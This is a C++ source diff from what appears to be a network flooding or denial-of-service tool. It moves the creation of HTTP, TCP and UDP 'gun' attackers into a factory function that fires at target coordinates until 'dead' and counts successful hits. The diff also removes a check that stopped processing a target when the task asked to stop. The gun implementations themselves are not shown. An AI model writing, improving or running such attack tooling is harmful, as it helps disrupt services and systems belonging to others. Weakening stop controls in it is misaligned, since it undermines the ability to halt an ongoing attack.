@@ -13,43 +13,41 @@ void Solider::ExecuteOrders(const TaskController &task, Attackers::Target &targe
 		if(target.NeedWeaponAim())
 		{
 			target.Retarget(task);
-			if(task.ShouldStop())
-			{
-				continue;
-			}
 		}
 
 		Attackers::AttackMethod method = target.GetAttackMethod();
 		const CURI coordinates = target.GetCoordinates();
 
-		Attackers::PGun gun;
-
-		switch(method)
-		{
-			case Attackers::AttackMethod::HTTPAttack:
-			{
-				gun = std::make_unique<Attackers::HTTPGun>(task);
-				break;
-			}
-			case Attackers::AttackMethod::TCPAttack:
-			{
-				gun = std::make_unique<Attackers::TCPGun>(task);
-				break;
-			}
-			case Attackers::AttackMethod::UDPAttack:
-			{
-				gun = std::make_unique<Attackers::UDPGun>(task);
-				break;
-			}
-			default:
-			{
-				SPDLOG_ERROR("Got not supported attacker");
-			}
-		}
-		if(gun)
+		if(Attackers::PGun gun = GunFactory(method, task))
 		{
 			hitsCount += gun->FireTillDead(coordinates);
 		}
 	}
 	SPDLOG_INFO("Stoping execution with {} succesfull hits", hitsCount);
+}
+
+
+Attackers::PGun Solider::GunFactory(Attackers::AttackMethod attackMethod,
+	const TaskController &owningTask)
+{
+	switch(attackMethod)
+	{
+		case Attackers::AttackMethod::HTTPAttack:
+		{
+			return std::make_unique<Attackers::HTTPGun>(owningTask);
+		}
+		case Attackers::AttackMethod::TCPAttack:
+		{
+			return std::make_unique<Attackers::TCPGun>(owningTask);
+		}
+		case Attackers::AttackMethod::UDPAttack:
+		{
+			return std::make_unique<Attackers::UDPGun>(owningTask);
+		}
+		default:
+		{
+			SPDLOG_ERROR("Got not supported attacker");
+			return nullptr;
+		}
+	}
 }
